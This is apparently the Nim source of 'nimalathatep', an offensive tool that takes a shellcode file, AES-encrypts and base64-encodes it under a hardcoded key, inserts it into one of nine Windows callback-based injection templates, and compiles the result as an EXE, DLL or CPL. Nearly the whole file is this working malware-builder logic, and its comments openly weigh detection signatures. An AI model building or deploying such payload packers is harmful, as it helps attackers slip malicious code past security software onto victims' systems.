import winim/lean
import os
import base64
import nimcrypto
import strutils




let banner = """
 ______ __  __  ____      ___ ____   ___  __    __ __    __ __  __   ___       ___ __  __  ___    ___    __ 
 | || | ||  || ||        //   || \\ // \\ ||    || ||    || ||\ ||  // \\     //   ||  || // \\  // \\  (( \
   ||   ||==|| ||==     ((    ||_// ||=|| \\ /\ // ||    || ||\\|| (( ___    ((    ||==|| ||=|| ((   ))  \\ 
   ||   ||  || ||___     \\__ || \\ || ||  \V/\V/  ||__| || || \||  \\_||     \\__ ||  || || ||  \\_//  \_))
                                                                                                            
        
                                                                ,* .,  ,., .                        
                                                           .**((((.        ,(%(//,                  
                                                           ,((((,     */      ,(((/.. .             
               ,/((((*      *(((/,,                         .*/*,              ,**,.                
           ..*(/#(              /(#(*,                          ./,.         ....                   
            .,/*/,              ,((/*,.                                                             
              .(//             .*,..                                                                
                    ..     ..                                                                       
                                                                                                    
                                                                                                    
                                      ,#(((////*//((*,.                       *(#(/*/,**/(/(*,.     
,* .*  **,,,,.                     *//#((/.          /##/(/.               ,*/#(##/         ./#(/(*.
#/.        ,##((*,*              .,/(##(               .(###*,            .*(#(((               /#((
              /###*,,             ..*/**       .        ,/*/*,.             ./*//                ,//
              ,((***,.               *//*               ,/,..                 ,*//,              *.,
             .,***.                      .,*.       ....                           ,,,        ,,... 
           .....                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                                                    
                                                                      .*.  ,   .. ,,.               
     ./#(#((((/,*/(/((/*,.                                        .*((((##/.      ,(#///,           
  ,*//#/((/           ,(#(///*,                                ..//(/(**             ./#((//*.      
 ,*((#((.                (####/..                              .,/(((#*                 *#((((,,    
 ,*//(/.      .          ,(/(***..                               ,*//(*                  */(*(*,,.  
  ,//,*.                 .***/** .                                .*//*,                 ,**/* .    
   .(//*                 ..,,.                                       ,///               .,...       
      .,,*.          ...,..                                               ,,,.       ., .           
               .                                                                                    
                                                                                                    
  
             ...quivering and afraid, into the sightless vortex of the unimaginable.

         
"""
echo banner
echo "\n\n"

echo "Usage: \n nimalathatep.exe <apiMethod> <binFile> <outfiletype>\n\n\n\n"
echo "Methods currently available:\n"
echo "EnumGeoID [enumgeoid]\n"
echo "CreateFiber [createfiber]\n"
echo "CreateRemoteThread [createremotethread] <--VERY SIGNATURED\n"
echo "CreateThreadpoolWait [reatehreadpoolait]\n"
echo "EnumLanguageGroupLocales [enumlanguage]\n"
echo "CryptEnumOIDInfo [cryptenum]\n"
echo "EnumDisplayMonitors [enumdisplay]\n"
echo "CertEnumSystemStore [enumsystemstore]\n"
echo "EnumDesktopWindows [enumdesktop]\n"

echo "File types currently available:\n"
echo "EXE, DLL, CPL\n"







proc main() = 
    let #get args
        apiMethod: string = paramStr(1)
        binFile: string = paramStr(2)
        fileType: string = paramStr(3)


    #read the file
    var file: File
    file = open(binFile, fmRead)
    var fileSize = file.getFileSize()
    var plaintext = newSeq[byte] (fileSize)
    discard file.readBytes(plaintext, 0, fileSize) #ignore the return value


 
    var
        ectx: CTR[aes256]
        key: array[aes256.sizeKey, byte]
        iv: array[aes256.sizeBlock, byte]
        encrypted: seq[byte] = newSeq[byte](len(plaintext))
    iv = [byte 183, 142, 238, 156, 42, 43, 248, 100, 125, 249, 192, 254, 217, 222, 133, 149] #why it be like this :( 
    var password: string = "ReallyReallyLongAndComplicatedPasswordThatReallyDoesntEvenNeedToBeThatCrazyTbhBecauseWhoIsGonnaReverseItAndTheyWouldntEvenNeedThePassword"
    var expandedKey = sha256.digest(password)
    copyMem(addr key[0], addr expandedKey.data[0], len(expandedKey.data))

        
    ectx.init(key, iv)
    ectx.encrypt(plaintext, encrypted)
    ectx.clear()
        
    # Base64 encode encrypted shellcode
    let encodedCrypted = encode(encrypted)

    echo "Encrypting and encoding payload. May your efforts be fruitful.\n"


    if apiMethod == "enumgeoid": 
        let file_path = ".\\apiMethods\\EnumGeoID\\EnumGeoID.nim"
        var file_target = file_path.readFile()
        let placeholder = "REPLACE_ME"
        let replacement =  encodedCrypted
        file_target = file_target.replace(placeholder, replacement)
        file_path.writeFile(file_target) #current issue! If you need to remake payload, you need to put the placeholder BACK into the file. Only takes a second but is annoying...
        if fileType == "exe":
            discard execShellCmd("nim -d:release --out:EnumGeoID.exe --app:gui c .\\apiMethods\\EnumGeoID\\EnumGeoID.nim")
        elif fileType == "dll":
            discard execShellCmd("nim -d:release --out:EnumGeoID.dll --app:lib c .\\apiMethods\\EnumGeoID\\EnumGeoID.nim")
        elif fileType == "cpl":
            discard execShellCmd("nim -d:release --out:EnumGeoID.cpl --app:lib c .\\apiMethods\\EnumGeoID\\EnumGeoID.nim")
        else:
            echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING. PLEASE REPLACE STRING IN THE TEMPLATE FILE.\n"
        #put it back!!
        let placeholder_new = encodedCrypted
        let replacement_new = "REPLACE_ME"
        file_target = file_target.replace(placeholder_new, replacement_new)
        file_path.writeFile(file_target)



    elif apiMethod == "createfiber": 
        let file_path = ".\\apiMethods\\CreateFiber\\CreateFiber.nim"
        var file_target = file_path.readFile()
        let placeholder = "REPLACE_ME"
        let replacement =  encodedCrypted
        file_target = file_target.replace(placeholder, replacement)
        file_path.writeFile(file_target) 
        if fileType == "exe":
            discard execShellCmd("nim -d:release --out:CreateFiber.exe --app:gui c .\\apiMethods\\CreateFiber\\CreateFiber.nim")
        elif fileType == "dll":
            discard execShellCmd("nim -d:release --out:CreateFiber.dll --app:lib c .\\apiMethods\\CreateFiber\\CreateFiber.nim")
        elif fileType == "cpl":
            discard execShellCmd("nim -d:release --out:CreateFiber.cpl --app:lib c .\\apiMethods\\CreateFiber\\CreateFiber.nim")
        else:
            echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING. PLEASE REPLACE STRING IN THE TEMPLATE FILE.\n"
        #put it back!!
        let placeholder_new = encodedCrypted
        let replacement_new = "REPLACE_ME"
        file_target = file_target.replace(placeholder_new, replacement_new)
        file_path.writeFile(file_target)
        
    elif apiMethod == "createremotethread": 
        let file_path = ".\\apiMethods\\CreateRemoteThread\\CreateRemoteThread.nim"
        var file_target = file_path.readFile()
        let placeholder = "REPLACE_ME"
        let replacement =  encodedCrypted
        file_target = file_target.replace(placeholder, replacement)
        file_path.writeFile(file_target) 
        if fileType == "exe":
            discard execShellCmd("nim -d:release --out:CreateRemoteThread.exe --app:gui c .\\apiMethods\\CreateRemoteThread\\CreateRemoteThread.nim")
        elif fileType == "dll":
            discard execShellCmd("nim -d:release --out:CreateRemoteThread.dll --app:lib c .\\apiMethods\\CreateRemoteThread\\CreateRemoteThread.nim")
        elif fileType == "cpl":
            discard execShellCmd("nim -d:release --out:CreateRemoteThread.cpl --app:lib c .\\apiMethods\\CreateRemoteThread\\CreateRemoteThread.nim")
        else:
            echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING. PLEASE REPLACE STRING IN THE TEMPLATE FILE.\n"
        #put it back!!
        let placeholder_new = encodedCrypted
        let replacement_new = "REPLACE_ME"
        file_target = file_target.replace(placeholder_new, replacement_new)
        file_path.writeFile(file_target)     
        
    elif apiMethod == "createthreadpoolwait": 
        let file_path = ".\\apiMethods\\CreateThreadpoolWait\\CreateThreadpoolWait.nim"
        var file_target = file_path.readFile()
        let placeholder = "REPLACE_ME"
        let replacement =  encodedCrypted
        file_target = file_target.replace(placeholder, replacement)
        file_path.writeFile(file_target) 
        if fileType == "exe":
            discard execShellCmd("nim -d:release --out:CreateThreadpoolWait.exe --app:gui c .\\apiMethods\\CreateThreadpoolWait\\CreateThreadpoolWait.nim")
        elif fileType == "dll":
            discard execShellCmd("nim -d:release --out:CreateThreadpoolWait.dll --app:lib c .\\apiMethods\\CreateThreadpoolWait\\CreateThreadpoolWait.nim")
        elif fileType == "cpl":
            discard execShellCmd("nim -d:release --out:CreateThreadpoolWait.cpl --app:lib c .\\apiMethods\\CreateThreadpoolWait\\CreateThreadpoolWait.nim")
        else:
            echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING. PLEASE REPLACE STRING IN THE TEMPLATE FILE.\n"
        #put it back!!
        let placeholder_new = encodedCrypted
        let replacement_new = "REPLACE_ME"
        file_target = file_target.replace(placeholder_new, replacement_new)
        file_path.writeFile(file_target)
        
    elif apiMethod == "enumlanguage": 
        let file_path = ".\\apiMethods\\EnumLanguageGroupLocales\\EnumLanguageGroupLocales.nim"
        var file_target = file_path.readFile()
        let placeholder = "REPLACE_ME"
        let replacement =  encodedCrypted
        file_target = file_target.replace(placeholder, replacement)
        file_path.writeFile(file_target) 
        if fileType == "exe":
            discard execShellCmd("nim -d:release --out:EnumLanguageGroupLocales.exe --app:gui c .\\apiMethods\\EnumLanguageGroupLocales\\EnumLanguageGroupLocales.nim")
        elif fileType == "dll":
            discard execShellCmd("nim -d:release --out:EnumLanguageGroupLocales.dll --app:lib c .\\apiMethods\\EnumLanguageGroupLocales\\EnumLanguageGroupLocales.nim")
        elif fileType == "cpl":
            discard execShellCmd("nim -d:release --out:EnumLanguageGroupLocales.cpl --app:lib c .\\apiMethods\\EnumLanguageGroupLocales\\EnumLanguageGroupLocales.nim")
        else:
            echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING. PLEASE REPLACE STRING IN THE TEMPLATE FILE.\n"
        #put it back!!
        let placeholder_new = encodedCrypted
        let replacement_new = "REPLACE_ME"
        file_target = file_target.replace(placeholder_new, replacement_new)
        file_path.writeFile(file_target)
        
    elif apiMethod == "cryptenum": 
        let file_path = ".\\apiMethods\\CryptEnumOIDInfo\\CryptEnumOIDInfo.nim"
        var file_target = file_path.readFile()
        let placeholder = "REPLACE_ME"
        let replacement =  encodedCrypted
        file_target = file_target.replace(placeholder, replacement)
        file_path.writeFile(file_target) 
        if fileType == "exe":
            discard execShellCmd("nim -d:release --out:CryptEnumOIDInfo.exe --app:gui c .\\apiMethods\\CryptEnumOIDInfo\\CryptEnumOIDInfo.nim")
        elif fileType == "dll":
            discard execShellCmd("nim -d:release --out:CryptEnumOIDInfo.dll --app:lib c .\\apiMethods\\CryptEnumOIDInfo\\CryptEnumOIDInfo.nim")
        elif fileType == "cpl":
            discard execShellCmd("nim -d:release --out:CryptEnumOIDInfo.cpl --app:lib c .\\apiMethods\\CryptEnumOIDInfo\\CryptEnumOIDInfo.nim")
        else:
            echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING. PLEASE REPLACE STRING IN THE TEMPLATE FILE.\n"
        #put it back!!
        let placeholder_new = encodedCrypted
        let replacement_new = "REPLACE_ME"
        file_target = file_target.replace(placeholder_new, replacement_new)
        file_path.writeFile(file_target)
        
    elif apiMethod == "enumdisplay": 
        let file_path = ".\\apiMethods\\EnumDisplayMonitors\\EnumDisplayMonitors.nim"
        var file_target = file_path.readFile()
        let placeholder = "REPLACE_ME"
        let replacement =  encodedCrypted
        file_target = file_target.replace(placeholder, replacement)
        file_path.writeFile(file_target) 
        if fileType == "exe":
            discard execShellCmd("nim -d:release --out:EnumDisplayMonitors.exe --app:gui c .\\apiMethods\\EnumDisplayMonitors\\EnumDisplayMonitors.nim")
        elif fileType == "dll":
            discard execShellCmd("nim -d:release --out:EnumDisplayMonitors.dll --app:lib c .\\apiMethods\\EnumDisplayMonitors\\EnumDisplayMonitors.nim")
        elif fileType == "cpl":
            discard execShellCmd("nim -d:release --out:EnumDisplayMonitors.cpl --app:lib c .\\apiMethods\\EnumDisplayMonitors\\EnumDisplayMonitors.nim")
        else:
            echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING. PLEASE REPLACE STRING IN THE TEMPLATE FILE.\n"
        #put it back!!
        let placeholder_new = encodedCrypted
        let replacement_new = "REPLACE_ME"
        file_target = file_target.replace(placeholder_new, replacement_new)
        file_path.writeFile(file_target)
        
    elif apiMethod == "enumsystemstore": 
        let file_path = ".\\apiMethods\\CertEnumSystemStore\\CertEnumSystemStore.nim"
        var file_target = file_path.readFile()
        let placeholder = "REPLACE_ME"
        let replacement =  encodedCrypted
        file_target = file_target.replace(placeholder, replacement)
        file_path.writeFile(file_target) 
        if fileType == "exe":
            discard execShellCmd("nim -d:release --out:CertEnumSystemStore.exe --app:gui c .\\apiMethods\\CertEnumSystemStore\\CertEnumSystemStore.nim")
        elif fileType == "dll":
            discard execShellCmd("nim -d:release --out:CertEnumSystemStore.dll --app:lib c .\\apiMethods\\CertEnumSystemStore\\CertEnumSystemStore.nim")
        elif fileType == "cpl":
            discard execShellCmd("nim -d:release --out:CertEnumSystemStore.cpl --app:lib c .\\apiMethods\\CertEnumSystemStore\\CertEnumSystemStore.nim")
        else:
            echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING. PLEASE REPLACE STRING IN THE TEMPLATE FILE.\n"
        #put it back!!
        let placeholder_new = encodedCrypted
        let replacement_new = "REPLACE_ME"
        file_target = file_target.replace(placeholder_new, replacement_new)
        file_path.writeFile(file_target)
        
    elif apiMethod == "enumdesktop": 
        let file_path = ".\\apiMethods\\EnumDesktopWindows\\EnumDesktopWindows.nim"
        var file_target = file_path.readFile()
        let placeholder = "REPLACE_ME"
        let replacement =  encodedCrypted
        file_target = file_target.replace(placeholder, replacement)
        file_path.writeFile(file_target) 
        if fileType == "exe":
            discard execShellCmd("nim -d:release --out:EnumDesktopWindows.exe --app:gui c .\\apiMethods\\EnumDesktopWindows\\EnumDesktopWindows.nim")
        elif fileType == "dll":
            discard execShellCmd("nim -d:release --out:EnumDesktopWindows.dll --app:lib c .\\apiMethods\\EnumDesktopWindows\\EnumDesktopWindows.nim")
        elif fileType == "cpl":
            discard execShellCmd("nim -d:release --out:EnumDesktopWindows.cpl --app:lib c .\\apiMethods\\EnumDesktopWindows\\EnumDesktopWindows.nim")
        else:
            echo "ERROR, WRONG FILE TYPE, COMPILATION ABORTING. PLEASE REPLACE STRING IN THE TEMPLATE FILE.\n"
        #put it back!!
        let placeholder_new = encodedCrypted
        let replacement_new = "REPLACE_ME"
        file_target = file_target.replace(placeholder_new, replacement_new)
        file_path.writeFile(file_target)
        
    #elif    
    else:
        echo "Error, didn't run API call compilation."






#catch all
when defined(windows):
    if 1>0:
        if paramCount() == 3:
            main()
        else: 
            echo "Usage: \n nimalathatep.exe <apiMethod> <binFile> <outfiletype> \n\n\n\n"